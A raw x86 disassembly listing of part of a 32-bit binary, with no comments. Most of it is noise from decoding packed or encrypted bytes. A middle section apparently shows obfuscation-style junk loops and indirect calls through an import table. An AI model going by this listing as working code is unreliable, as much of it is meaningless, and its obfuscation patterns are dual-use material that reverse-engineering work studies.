  4135a1:	jle    0x413597
  4135a3:	jno    0x4135f9
  4135a5:	adc    eax,ebx
  4135a7:	stos   DWORD PTR es:[edi],eax
  4135a8:	push   esp
  4135a9:	mov    esi,0xd0bf506a
  4135ae:	neg    BYTE PTR [esi-0x6d]
  4135b1:	sub    ecx,DWORD PTR [ecx]
  4135b3:	jmp    0xd366:0xa3638f29
  4135ba:	gs jp  0x4135a4
  4135bd:	in     eax,0x7
  4135bf:	(bad)  
  4135c0:	mov    dh,0x54
  4135c2:	inc    esp
  4135c3:	out    0x54,al
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	inc    ebp
  4135c7:	add    edx,esi
  4135c9:	xor    cl,cl
  4135cb:	ja     0x413633
  4135cd:	sbb    dh,BYTE PTR [ebp+0x722d9c12]
  4135d3:	shl    BYTE PTR [esi],1
  4135d5:	xchg   esp,eax
  4135d6:	sub    al,BYTE PTR [eax]
  4135d8:	and    eax,0xedcd655
  4135dd:	stos   DWORD PTR es:[edi],eax
  4135de:	inc    ecx
  4135df:	sub    eax,0x768b4552
  4135e4:	inc    DWORD PTR [ebx+0x77f879f2]
  4135ea:	add    DWORD PTR [edx+0x40],edx
  4135ed:	nop
  4135ee:	push   ebp
  4135ef:	adc    BYTE PTR [ebp+0xee12f5c],al
  4135f5:	dec    edx
  4135f6:	data16 adc al,0xe2
  4135f9:	aad    0x4d
  4135fb:	xchg   DWORD PTR [ecx+0x7c],eax
  4135fe:	std    
  4135ff:	or     al,0x7b
  413601:	lea    esi,[ecx-0x2e]
  413604:	xor    BYTE PTR [esi-0xee9f265],dh
  41360a:	(bad)  
  41360c:	mov    bl,0x14
  41360e:	dec    edx
  41360f:	push   ds
  413610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413611:	sub    eax,0xe1a4b54
  413616:	sub    DWORD PTR [esi],esp
  413618:	pop    esi
  413619:	popa   
  41361a:	xor    eax,0xf4d9bbc2
  41361f:	outs   dx,DWORD PTR ds:[esi]
  413620:	or     ebp,DWORD PTR [ebx+0x71]
  413623:	call   0x4f1:0xaabfed8f
  41362a:	popa   
  41362b:	pop    edx
  41362c:	or     bh,ch
  41362e:	repnz inc ebp
  413630:	mov    WORD PTR [ecx-0x76],ds
  413633:	leave  
  413634:	or     DWORD PTR [ebx],esp
  413636:	ss mov cl,0xd3
  413639:	ins    BYTE PTR es:[edi],dx
  41363a:	pop    ebp
  41363b:	or     edi,DWORD PTR [esp+esi*1]
  41363e:	lods   eax,DWORD PTR ds:[esi]
  41363f:	mov    bh,0x52
  413641:	xchg   BYTE PTR [eax-0x2a],al
  413644:	fsubr  DWORD PTR [edx+0x4c2c7faa]
  41364a:	daa    
  41364b:	mov    ebx,0x1d6fda07
  413650:	sbb    al,0xc3
  413652:	sub    ebp,DWORD PTR [ebx]
  413654:	js     0x4136bf
  413656:	les    ebx,FWORD PTR [edi]
  413658:	or     DWORD PTR [ecx-0x70],ecx
  41365b:	ins    BYTE PTR es:[edi],dx
  41365c:	pop    ebx
  41365d:	inc    ecx
  41365e:	mov    ch,0x7d
  413660:	ret    
  413661:	lods   eax,DWORD PTR ds:[esi]
  413662:	cwde   
  413663:	cli    
  413664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413665:	fsubr  QWORD PTR [ecx]
  413667:	scas   al,BYTE PTR es:[edi]
  413668:	lea    edi,[eax+ebx*1-0x43120d0f]
  41366f:	in     al,dx
  413670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413671:	lahf   
  413672:	inc    esp
  413673:	retf   
  413674:	scas   eax,DWORD PTR es:[edi]
  413675:	(bad)  
  413676:	pop    ss
  413677:	sub    DWORD PTR [esi],edx
  413679:	mov    ss,WORD PTR [ebp+0x5c86458b]
  41367f:	adc    eax,0x180f14c6
  413684:	in     al,0x22
  413686:	retf   0xdbeb
  413689:	pop    esp
  41368a:	push   ebx
  41368b:	jb     0x413669
  41368d:	mov    ebx,0x8b5ef6f2
  413692:	sar    ecx,1
  413694:	mov    BYTE PTR [esi+0x3],ch
  413697:	rcr    DWORD PTR [ecx],0xb2
  41369a:	xchg   BYTE PTR [edi+0x31],ch
  41369d:	repz cmc 
  41369f:	arpl   WORD PTR [esp+edx*4+0xec81cb1],sp
  4136a6:	inc    esi
  4136a7:	stos   BYTE PTR es:[edi],al
  4136a8:	pop    es
  4136a9:	out    0xe8,eax
  4136ab:	xor    BYTE PTR [eax-0x6e],cl
  4136ae:	es sbb eax,esi
  4136b1:	sub    BYTE PTR [ebx-0x6ee35009],bl
  4136b7:	retf   
  4136b8:	ins    BYTE PTR es:[edi],dx
  4136b9:	xor    bl,BYTE PTR [edi-0xa]
  4136bc:	cvtps2pd xmm7,QWORD PTR [edx+0x0]
  4136c0:	adc    DWORD PTR ds:0xc8f27b50,eax
  4136c6:	(bad)  
  4136c7:	mov    dh,0x85
  4136c9:	lahf   
  4136ca:	aas    
  4136cb:	pop    eax
  4136cc:	or     eax,0xdde341b4
  4136d1:	dec    ebx
  4136d2:	int    0x19
  4136d4:	hlt    
  4136d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136d6:	jns    0x41370f
  4136d8:	call   0xd940:0x276f8589
  4136df:	pop    eax
  4136e0:	mov    eax,0x7e6bbc87
  4136e5:	xor    DWORD PTR [eax],eax
  4136e7:	std    
  4136e8:	fwait
  4136e9:	or     DWORD PTR [esi-0x7f2dd396],ecx
  4136ef:	sar    BYTE PTR [edi],1
  4136f1:	adc    cl,BYTE PTR [ebp-0x4]
  4136f4:	gs dec ebp
  4136f6:	mov    ah,0xf2
  4136f8:	dec    edx
  4136f9:	pop    esi
  4136fa:	push   esp
  4136fb:	dec    ebx
  4136fc:	ds jns 0x4136d6
  4136ff:	xchg   ebx,eax
  413700:	mov    esp,0x4aaa4225
  413705:	outs   dx,DWORD PTR ds:[esi]
  413706:	mov    bh,0xa1
  413708:	and    BYTE PTR [ebp+0x3d],ah
  41370b:	or     BYTE PTR [edi],0xc2
  41370e:	jmp    0xbdc237f7
  413713:	ss push 0xe15d92a6
  413719:	mov    edi,0xed42937f
  41371e:	(bad)  
  41371f:	mov    cx,sp
  413722:	dec    ebp
  413723:	loopne 0x41373b
  413725:	sbb    bh,BYTE PTR [esi]
  413727:	test   eax,0x5edc77e8
  41372c:	out    0x8f,eax
  41372e:	fist   WORD PTR [edi-0x2b8ee6b7]
  413734:	test   ah,ch
  413736:	ins    DWORD PTR es:[edi],dx
  413737:	and    al,0x7e
  413739:	push   ss
  41373a:	sbb    eax,0x898b0ebb
  41373f:	pop    ebp
  413740:	stos   BYTE PTR es:[edi],al
  413741:	sbb    BYTE PTR [eax-0x1a],0x55
  413745:	mov    bh,0x1
  413747:	cld    
  413748:	dec    ebp
  413749:	das    
  41374a:	push   ss
  41374b:	add    DWORD PTR [eax+0x7e53299d],0xffffffe1
  413752:	jmp    0xb7e5fe13
  413757:	retf   
  413758:	lods   al,BYTE PTR ds:[esi]
  413759:	inc    eax
  41375a:	pop    esp
  41375b:	pop    ss
  41375c:	test   al,bl
  41375e:	ins    DWORD PTR es:[edi],dx
  41375f:	frstor [ebx-0x1b]
  413762:	jg     0x41373c
  413764:	shl    bl,0xb4
  413767:	loopne 0x41371d
  413769:	iret   
  41376a:	dec    edi
  41376b:	ror    DWORD PTR [esp+edi*4],0xbc
  41376f:	pop    ebx
  413770:	retf   0xc762
  413773:	sbb    eax,0x2ac94cff
  413778:	lock sub DWORD PTR ds:0x6b62eaaa,edi
  41377f:	in     al,dx
  413780:	enter  0xf875,0xe6
  413784:	cli    
  413785:	and    ebp,esp
  413787:	int    0x14
  413789:	or     BYTE PTR [edi+0x697f31b7],ch
  41378f:	cmp    DWORD PTR [ebx+0x34],edx
  413792:	mov    ch,0x19
  413794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413795:	push   es
  413796:	sahf   
  413797:	nop
  413798:	test   eax,0x1101ffcf
  41379d:	jno    0x413782
  41379f:	add    dh,BYTE PTR [esi]
  4137a1:	fisub  WORD PTR fs:[esp+esi*4-0x3c]
  4137a6:	xlat   BYTE PTR ds:[ebx]
  4137a7:	and    al,0xd9
  4137a9:	js     0x4137c0
  4137ab:	lds    ebp,FWORD PTR [ecx]
  4137ad:	inc    eax
  4137ae:	xchg   ecx,eax
  4137af:	test   DWORD PTR [ebx],0xf46b91f8
  4137b5:	push   edi
  4137b6:	jecxz  0x41381f
  4137b8:	lahf   
  4137b9:	mov    cl,0x6d
  4137bb:	inc    esi
  4137bc:	jnp    0x41374e
  4137be:	out    0xa2,eax
  4137c0:	fwait
  4137c1:	push   es
  4137c2:	push   0x7ea811f1
  4137c7:	outs   dx,BYTE PTR ds:[esi]
  4137c8:	lea    ebx,[edx-0x49]
  4137cb:	or     DWORD PTR [edx+eax*1+0x6eca9496],esp
  4137d2:	ss (bad) 
  4137d4:	ss pop esp
  4137d6:	ds push es
  4137d8:	push   ebp
  4137d9:	xor    bh,ch
  4137db:	dec    ebx
  4137dc:	mov    bl,0xeb
  4137de:	lahf   
  4137df:	out    dx,eax
  4137e0:	das    
  4137e1:	ja     0x413787
  4137e3:	mov    bh,0xf3
  4137e5:	popf   
  4137e6:	jmp    0x41382d
  4137e8:	ret    0x5540
  4137eb:	nop
  4137ec:	outs   dx,BYTE PTR ds:[esi]
  4137ed:	icebp  
  4137ee:	sbb    dh,dl
  4137f0:	xor    ebx,DWORD PTR [esi+esi*1]
  4137f3:	mov    edx,0xf8c021a3
  4137f8:	inc    eax
  4137f9:	inc    esi
  4137fa:	(bad)  
  4137fb:	xor    cl,BYTE PTR [ebx+eiz*4]
  4137fe:	bound  edx,QWORD PTR [eax-0x31]
  413801:	ins    DWORD PTR es:[edi],dx
  413802:	sbb    edi,DWORD PTR [ecx+0x5fd53f8a]
  413808:	sbb    al,BYTE PTR [ebx-0x41]
  41380b:	mov    es,WORD PTR [edi]
  41380d:	aas    
  41380e:	sti    
  41380f:	sub    bh,BYTE PTR ds:[esi-0x17609357]
  413816:	xchg   edx,eax
  413817:	rol    BYTE PTR [ebx+0x5df8927],1
  41381d:	and    esp,edx
  41381f:	in     al,0x99
  413821:	cdq    
  413822:	test   eax,0x8264c095
  413827:	adc    DWORD PTR [ebp+0x4b],0xa53e8aa7
  41382e:	dec    ecx
  41382f:	add    bl,BYTE PTR [ebx]
  413831:	adc    bl,BYTE PTR [edx-0x4249e620]
  413837:	inc    ebx
  413838:	push   eax
  413839:	jne    0x4137c1
  41383b:	sub    BYTE PTR [eax+0x14],0xaf
  41383f:	frstor [eax-0x6a]
  413842:	aaa    
  413843:	push   0xc38c6e5f
  413848:	or     ebp,esp
  41384a:	pusha  
  41384b:	mov    ah,0xe
  41384d:	(bad)  
  41384e:	icebp  
  41384f:	and    eax,0x165c5398
  413854:	push   ds
  413855:	sar    BYTE PTR [esi],cl
  413857:	inc    eax
  413858:	jecxz  0x4137fb
  41385a:	cmp    al,0x8b
  41385c:	inc    edi
  41385d:	xor    BYTE PTR [edx-0x5d1ac21d],bh
  413863:	dec    edi
  413864:	(bad)  
  413865:	mov    ebx,0x575f2dbe
  41386a:	mov    ds:0x1ae8b50a,al
  41386f:	in     eax,dx
  413870:	aas    
  413871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413872:	shl    DWORD PTR [esi+0x5b],1
  413875:	pushf  
  413876:	mov    edi,0xd1e9b90a
  41387b:	dec    ebx
  41387c:	jae    0x413820
  41387e:	out    0x8d,eax
  413880:	data16 and bh,ah
  413883:	stc    
  413884:	jno    0x413853
  413886:	or     eax,0x5edff2f6
  41388b:	xor    DWORD PTR [ebx+0x3b],eax
  41388e:	pop    ss
  41388f:	lods   eax,DWORD PTR ds:[esi]
  413890:	mov    esp,0x39b375d1
  413895:	and    cl,BYTE PTR [ebp-0x40]
  413898:	adc    eax,0xefe70a11
  41389d:	in     al,dx
  41389e:	not    BYTE PTR [ecx]
  4138a0:	iret   
  4138a1:	mov    ebp,0x5de34a4a
  4138a6:	xor    cl,al
  4138a8:	add    DWORD PTR [edx+ebx*2-0x234e7f75],esi
  4138af:	outs   dx,BYTE PTR ds:[esi]
  4138b0:	fwait
  4138b1:	std    
  4138b2:	inc    bh
  4138b4:	test   al,0xd9
  4138b6:	leave  
  4138b7:	jl     0x4138c5
  4138b9:	inc    ecx
  4138ba:	cmp    al,0x0
  4138bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138bd:	lea    eax,[edx-0x6812593a]
  4138c3:	sbb    bh,dh
  4138c5:	fadd   QWORD PTR [eax+0x164b41bf]
  4138cb:	pop    ecx
  4138cc:	(bad)  
  4138ce:	pusha  
  4138cf:	jo     0x413910
  4138d1:	repnz mov ecx,0xfaac4416
  4138d7:	dec    ecx
  4138d8:	cmp    al,BYTE PTR [esp+edx*8-0x37]
  4138dc:	sbb    BYTE PTR [esi+0x79],0xe8
  4138e0:	and    dh,BYTE PTR [esi-0x7e27cce7]
  4138e6:	and    eax,0x42b01c
  4138eb:	dec    si
  4138ed:	add    BYTE PTR [eax],al
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413c53
  413cce:	shl    bh,cl
  413cd0:	cs adc al,0x8a
  413cd3:	jl     0x413d51
  413cd5:	inc    eax
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	mov    bl,0x45
  413cdb:	xchg   ecx,eax
  413cdc:	ins    DWORD PTR es:[edi],dx
  413cdd:	cdq    
  413cde:	in     al,dx
  413cdf:	jle    0x413c7b
  413ce1:	pop    ds
  413ce2:	(bad)  
  413ce3:	sub    ebx,edi
  413ce5:	dec    ecx
  413ce6:	mov    al,0x4a
  413ce8:	scas   eax,DWORD PTR es:[edi]
  413ce9:	arpl   di,bp
  413ceb:	cld    
  413cec:	jno    0x413d67
  413cee:	dec    ecx
  413cef:	push   0x91acedcc
  413cf4:	pop    ebx
  413cf5:	add    eax,0x9e0b2616
  413cfa:	retf   0x5d69
  413cfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cfe:	addr16 nop
  413d00:	mov    edi,0xc55d8008
  413d05:	fcmovnu st,st(7)
  413d07:	sub    bh,BYTE PTR [edx]
  413d09:	xor    eax,0xbc9f1b2b
  413d0e:	(bad)  
  413d0f:	lods   al,BYTE PTR ds:[esi]
  413d10:	xchg   esp,esi
  413d12:	mov    ds:0x6562f74f,eax
  413d17:	dec    edx
  413d18:	xchg   DWORD PTR [ecx-0x54755a10],edi
  413d1e:	lock pop ds
  413d20:	jecxz  0x413ce8
  413d22:	adc    ebp,eax
  413d24:	mov    eax,0x4408d923
  413d29:	mov    ebx,0x5a580800
  413d2e:	mov    ecx,0xa531e428
  413d33:	jmp    0x1fe:0x4f4e575c
  413d3a:	outs   dx,DWORD PTR ds:[esi]
  413d3b:	mov    eax,ds:0xd7ee65dd
  413d40:	popa   
  413d41:	push   ebx
  413d42:	and    BYTE PTR [ecx-0x726d9f3],ch
  413d48:	rcr    DWORD PTR [ebx],0x38
  413d4b:	gs inc esi
  413d4d:	add    DWORD PTR [ebp*1-0x265732af],ecx
  413d54:	xchg   ecx,eax
  413d55:	adc    eax,DWORD PTR [ebx+0x4621bf67]
  413d5b:	sub    ch,BYTE PTR [eax-0x1b]
  413d5e:	jae    0x413dc5
  413d60:	data16 test al,0x2e
  413d63:	leave  
  413d64:	mov    eax,0x28f6e84a
  413d69:	rcl    DWORD PTR [ebp-0x62],0xe6
  413d6d:	dec    eax
  413d6e:	jp     0x413d74
  413d70:	xchg   ecx,eax
  413d71:	aaa    
  413d72:	and    bh,BYTE PTR [eax+edx*4+0x781cc5e6]
  413d79:	enter  0xe928,0x85
  413d7d:	sbb    BYTE PTR [edi],bl
  413d7f:	pushf  
  413d80:	cmp    DWORD PTR [edx],esi
  413d82:	push   ebx
  413d83:	cmp    al,BYTE PTR [eax]
  413d85:	push   ebx
  413d86:	jmp    DWORD PTR [esi+0x5e]
  413d89:	js     0x413daf
  413d8b:	add    eax,0x573f4e14
  413d90:	out    0xb5,eax
  413d92:	les    edx,FWORD PTR [edx+0x7e]
  413d95:	stos   DWORD PTR es:[edi],eax
  413d96:	fld    TBYTE PTR [ebp-0x55]
  413d99:	xchg   esp,eax
  413d9a:	cmp    bl,BYTE PTR [eax-0x5b9971f4]
  413da0:	push   esp
  413da1:	neg    DWORD PTR [ecx-0x1e]
  413da4:	nop
  413da5:	fld    DWORD PTR [edx+eax*8+0x2870e58d]
  413dac:	pop    ds
  413dad:	or     BYTE PTR [edi-0x44],ch
  413db0:	pop    edx
  413db1:	mov    ebx,0x259c3bae
  413db6:	sub    al,0x36
  413db8:	push   cs
  413db9:	clc    
  413dba:	loop   0x413dfc
  413dbc:	js     0x413e33
  413dbe:	dec    edi
  413dbf:	test   al,0x3a
  413dc1:	test   al,0x1a
  413dc3:	stos   BYTE PTR es:[edi],al
  413dc4:	pop    ebp
  413dc5:	shl    ebx,1
  413dc7:	jne    0x413db9
  413dc9:	inc    ebx
  413dca:	clc    
  413dcb:	xchg   ecx,eax
  413dcc:	mov    edi,DWORD PTR [edi+0x5a]
  413dcf:	and    DWORD PTR [edx-0x46c3d86c],edi
  413dd5:	cmp    ecx,DWORD PTR [ebx-0x37]
  413dd8:	jnp    0x413e32
  413dda:	bnd ret 
  413ddc:	out    dx,eax
  413ddd:	and    DWORD PTR [ebx],esi
  413ddf:	shr    BYTE PTR [ebx],1
  413de1:	addr16 in eax,dx
  413de3:	xor    eax,0x348dffb3
  413de8:	shl    al,0x8d
  413deb:	and    BYTE PTR [esi],ch
  413ded:	adc    esp,ebx
  413def:	(bad)  
  413df0:	sahf   
  413df1:	mov    ds,edx
  413df3:	xchg   ebx,eax
  413df4:	gs pop ds
  413df6:	xor    DWORD PTR [ecx-0x16bbece9],ebx
  413dfc:	sbb    ebp,DWORD PTR [edx+esi*2-0x7f]
  413e00:	mov    ?,WORD PTR [eax-0x1a18efb8]
  413e06:	cmp    edi,esp
  413e08:	scas   eax,DWORD PTR es:[edi]
  413e09:	xor    ebp,DWORD PTR [ebx-0x5e385193]
  413e0f:	lea    esi,[ecx-0x573f1147]
  413e15:	out    0x9c,eax
  413e17:	push   edi
  413e18:	mov    ds,WORD PTR [edi]
  413e1a:	aad    0x7e
  413e1c:	push   0xffffffed
  413e1e:	and    DWORD PTR [ecx+edx*4],ebp
  413e21:	mov    eax,0x3d81216e
  413e26:	loope  0x413e4c
  413e28:	(bad)  
  413e29:	out    0x66,eax
  413e2b:	pop    esi
  413e2c:	adc    bl,BYTE PTR [eax+0x7889f94a]
  413e32:	dec    esi
  413e33:	test   BYTE PTR [edx-0x56358e24],ch
  413e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e3a:	sub    BYTE PTR [ebp+0x1932f1f3],bh
  413e40:	xchg   edi,eax
  413e41:	xchg   ecx,eax
  413e42:	cmp    bl,al
  413e44:	mov    al,0x18
  413e46:	or     eax,ebx
  413e48:	inc    dx
  413e4a:	dec    esp
  413e4b:	test   eax,0xd357bc54
  413e50:	test   ch,ah
  413e52:	or     esi,edx
  413e54:	(bad)  
  413e55:	xchg   edi,eax
  413e56:	aas    
  413e57:	sub    al,0xe9
  413e59:	xchg   edx,eax
  413e5a:	test   DWORD PTR [edi-0xa],edx
  413e5d:	enter  0xaa8d,0xe5
  413e61:	xor    bl,BYTE PTR [edi]
  413e63:	mov    cl,0x1
  413e65:	mov    ebx,0x2f76223e
  413e6a:	add    al,0x1f
  413e6c:	add    eax,0x974f6637
  413e71:	cmp    ah,BYTE PTR [ecx]
  413e73:	mov    al,0x25
  413e75:	pop    ebx
  413e76:	into   
  413e77:	push   ebp
  413e78:	adc    al,0x92
  413e7a:	enter  0x1e92,0x69
  413e7e:	pop    edx
  413e7f:	mov    bh,0x2c
  413e81:	loope  0x413e9f
  413e83:	push   esi
  413e84:	fs scas eax,DWORD PTR es:[edi]
  413e86:	sub    ebx,DWORD PTR [ebp-0x41]
  413e89:	inc    ebx
  413e8a:	hlt    
  413e8b:	mov    edx,0x2b11708c
  413e90:	jne    0x413e82
  413e92:	dec    ecx
  413e93:	push   edx
  413e94:	fsubr  st(1),st
  413e96:	or     ebp,DWORD PTR [ebx+0x71]
